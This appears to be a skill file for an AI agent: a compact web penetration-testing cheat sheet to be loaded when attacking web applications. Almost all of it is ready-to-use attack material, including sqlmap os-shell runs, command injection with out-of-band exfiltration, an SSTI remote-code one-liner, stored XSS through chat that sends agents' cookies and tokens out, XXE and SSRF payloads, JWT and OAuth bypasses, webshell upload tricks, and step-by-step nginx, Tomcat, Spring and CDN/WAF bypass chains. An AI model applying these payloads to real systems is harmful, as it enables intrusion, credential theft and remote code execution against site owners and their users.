---
name: web-attack-methods
description: >-
  Web full-stack attacks: SQLi/command injection/SSTI/XSS/SSRF/NoSQL, auth JWT/OAuth/SAML, LFI/upload, Tomcat/WS/STOMP/XFF/PATH_INFO/CDN502/Wangsu JS-challenge bypass. Use when testing Web injection, auth bypass, server-side, WAF/CDN bypass.
metadata:
  tags: [pentest, penetration-testing, red-team]
---

## Web Attack Techniques (injection / authentication / server-side / misc / CDN)

```
=== Web injection ===
SQLi: sqlmap -u URL --technique=BEUSTQ --risk=3 --level=5 --os-shell | manual test ' OR 1=1-- / ' AND SLEEP(5)--
  Bypass SEL/**/ECT, case variation, CHAR() | escalate OUTFILE → webshell / xp_cmdshell / UDF
Command injection: ; | && $(cmd) `cmd` %0a | bypass spaces with $IFS, bypass cat with tac/nl | OOB ;nslookup $(whoami).OOB
SSTI: {{7*7}}Jinja2 ${7*7}FreeMarker #{7*7}Ruby | Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
XSS: HTML/attribute/JS/href/DOM/SVG | bypass CSP with JSONP/AngularJS CDN | XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd">/"http://OOB/"
🚨 Stored XSS via WebSocket/STOMP chat: the agent panel of a customer-service system (OCS/LiveChat) commonly uses innerHTML/v-html to render visitor messages (Vue domProps innerHTML)
  Attack chain: visitor STOMP connection → send a message containing <img src=x onerror=fetch(...)> → the agent opens the conversation → the XSS executes in the agent's browser → steal cookie/token/localStorage
  Key: the agent's browser can usually reach the internet (not bound by the backend's air-gap)! payload goal: document.cookie + localStorage + fetch(admin API).then(exfil)
  Bypass: messages with mf:1 (visitor identity), tp:0 (text type) content goes straight to innerHTML; image messages use the url field (<img src>) and do not go through innerHTML
SSRF: bypass IP 2130706433/[::1]/nip.io/#@ | cloud metadata 169.254.169.254 | Redis gopher://127.0.0.1:6379/_
NoSQL: {"password":{"$ne":""}} / {"$regex":"^a"}

=== Authentication/authorization ===
Auth bypass: admin'-- | password reset (predictable token/Host-header injection) | MFA bypass (skip/brute-force 4-6 digits) | X-Forwarded-For IP rotation
IDOR: swap the resource ID for horizontal privilege escalation | mass assignment {"role":"admin","isAdmin":true}
JWT: jwt_tool -X a (alg none/RS256→HS256) | -C to brute weak keys | kid injection | jku/x5u remote key
401/403 bypass: /admin/ /Admin /%2561dmin /admin;/ /admin..;/ | X-Original-URL/X-Rewrite-URL/X-Forwarded-For:127.0.0.1
OAuth/OIDC: redirect_uri manipulation (replacement/suffix/@ confusion/path traversal) | missing state → CSRF | PKCE downgrade | apply all JWT attacks to id_token
SAML: XSW signature wrapping (SAML Raider) | signature stripping | comment truncation admin<!---->@evil | Golden SAML (IdP private key)

=== Server-side ===
LFI: ../../../etc/passwd | php://filter to read source | data:// expect:// phar:// | RCE chain: log poisoning/session poisoning/phar deserialization
File upload: shell.php.jpg/.PHP/.php./%00 | .htaccess to change parsing | GIF89a magic bytes | ImageMagick/Ghostscript
🚨 Spring Boot Actuator path traversal bypasses the auth interceptor: the interceptor matches /api/* but actuator is whitelisted → /actuator/../api/v1/endpoint bypasses the interceptor to reach the protected endpoint
  Principle: Spring Security/custom interceptors match the path before normalization, while Tomcat routes after normalizing the path → path traversal bypasses the interceptor but still reaches the target Servlet
  Verification: /actuator/health returns 200 (whitelisted) → the /actuator/../target path also returns 200 (bypass) vs direct /target returns 403/sign is empty (blocked) | /actuator/health/../../target (template path {*path} traversal)
  sign-validation weakness: many custom sign checks only verify the header is non-empty (sign: any value + expTime: any number passes) → getting code:500 instead of "sign is empty" = validation passed | quick check: sign:0 or sign:aaa changing from "sign is empty" to 500 = it only checks for non-empty
  Escalation: after bypassing, combine with X-HTTP-Method-Override: POST to make a GET request trigger the POST handler (supported by some Spring configurations)

=== Web misc ===
🚨 Tomcat ..;/ bypasses nginx path restrictions: nginx does not parse the ; in the URL (treats it as part of the path) but Tomcat treats ..;/ as path traversal:
  /api/v1/v/..;/admin/path → nginx matches /api/v1/v/ (allowed) → Tomcat resolves it as /admin/path (traversal!)
  Verification: normal /admin returns nginx 403; using /api/v1/v/..;/admin returns Tomcat 404 = bypass succeeded
  Limitation: the Spring MVC DispatcherServlet routing is independent of the filesystem; you can only access static files within the same war/non-MVC paths
  Combination: combine with a JSP webshell written via Spring4Shell, or access the actuator endpoint
🚨 WebSocket/STOMP frames bypass nginx method restrictions: nginx returns 405 for POST /api/v1/a/login, but after a WebSocket upgrade the STOMP frames are unrestricted:
  1. GET /api/v1/v/ws/{3 chars}/{8 random}/websocket → 101 Upgrade (bypass via the visitor path)
  2. STOMP CONNECT → STOMP SEND destination:/app/a/login → reaches the Spring backend directly
  SockJS XHR alternative: POST .../xhr_send to send a STOMP frame (204 = success), no real WebSocket needed
  Pitfall: the CDN disconnects quickly ("Another connection still open"); a raw socket is more stable than a websocket library
🚨 X-Forwarded-For bypasses the application-layer IP blacklist: the CDN trusts the XFF header, and the application takes the client IP from XFF for the blacklist check:
  Effective: X-Forwarded-For: 1.1.1.1 | X-Forwarded-For: 127.0.0.1, 10.0.0.1
  Ineffective: X-Real-IP, X-Client-IP, CF-Connecting-IP, True-Client-IP, Forwarded
  Detection: the response contains {code:10010, msg:"黑名单"} and the data field is your real IP
🚨 PATH_INFO nginx deny bypass: nginx denies .php files (returns a 146B nginx 404) but PHP-FPM is still reachable via PATH_INFO:
  /denied/file.php → 404|146 (nginx blocks) | /denied/file.php/ → 16B "File not found." (PHP-FPM executes!)
  /denied/file.php/x → same as above. PHP-FPM returning "File not found." means the request penetrated the nginx deny and reached PHP-FPM (only the script path is wrong)
  Exploit: if PHP is configured with cgi.fix_pathinfo=1 (default), /uploads/shell.jpg/x.php → PHP executes shell.jpg! | after confirming it exists, find FPM's actual docroot (may differ from nginx)
  Identification: nginx deny returns a fixed size (146B standard 404), PHP-FPM returns 16B "File not found." → the size difference is the breakthrough signal
🚨 Response-size fingerprint (hidden-file discovery): a CMS catch-all route returns a fixed-size homepage (e.g. 44004B), a real nginx 404 returns 146B
  File exists but is denied: returns 146B (nginx 404) | file does not exist: returns the catch-all size (44004B) | → 146B = the file really exists!
  Method: batch-scan paths and classify by response size: catch-all = does not exist, nginx404 = exists but denied, other sizes = accessible
WAF bypass decision tree: encoding → protocol-level → path → mutation → IP spoofing → smuggling | CORS: Origin reflection + Credentials:true
🚨 CDN 502 bypass (URL-pattern filtering): when the CDN returns 502 for the admin path, HTTP encoding/smuggling/method changes are all ineffective → switch protocols:
  ① WebSocket upgrade: a CDN usually only filters HTTP responses, and the WS path may not be in the filter rules. /api/v1/a/ws/ returning 200 while /api/v1/a/doLogin returns 502 = the WS path is not filtered
  ② find the origin IP for a direct connection: DNS history/certificate transparency/SNI scanning/same-subnet scanning/email-header Return-Path/Shodan fingerprint matching/CDN origin-config leak/unique error-page fingerprint → bypass the CDN and connect directly to the backend
  ③ non-standard ports: scan all ports of the CDN node; some ports may proxy a different backend or have different filter rules (e.g. 8085 exposes actuator)
  ④ path traversal: /api/v1/v/..;/a/doLogin makes Tomcat route to admin but the CDN may not recognize it (note: the CDN may still filter the response)
  ⑤ wildcard-resolution identification: all subdomains resolving to the CDN = wildcard DNS, not real records. Compare results with 114.114.114.114/8.8.8.8
🚨 WSCN/Wangsu CDN JS-challenge identification and bypass: the response contains `_jsc_ch_conf`+`ws_sec_page.js` = Wangsu JS challenge (not WAF blocking)
  Characteristics: cv:".domain", mt:"jhsq987", chType/chTs/chID/chHash fields | the 403 page has 6000+ bytes containing "Embed Iframe"
  Bypass: the CDN only skips the challenge for a specific path whitelist (e.g. /c/) → use Spring Boot ..;/ traversal (`/c/..;/target_path`) to penetrate to other backend routes
  Identify the backend framework: a JSON error `{"timestamp":...,"status":...,"error":...,"path":...}` = Spring Boot | 405 = the route exists but the method is wrong

=== CDN bypass (target hidden behind a CDN, the admin endpoint returns 502) ===
CDN 502 analysis: distinguish URL-pattern filtering (fixed timing ~0.3s, all methods/encodings/ports/nodes return 502) vs response-content filtering vs backend down
  Key judgment: if path traversal (`/api/v1/v/..;/a/doLogin`) returns a Tomcat 404 = penetrated the CDN to the backend, returning 502 = CDN URL-pattern blocking
  nginx 502 vs CDN PWS 502: nginx = the edge-layer reverse proxy is down, PWS = CDN global policy
```
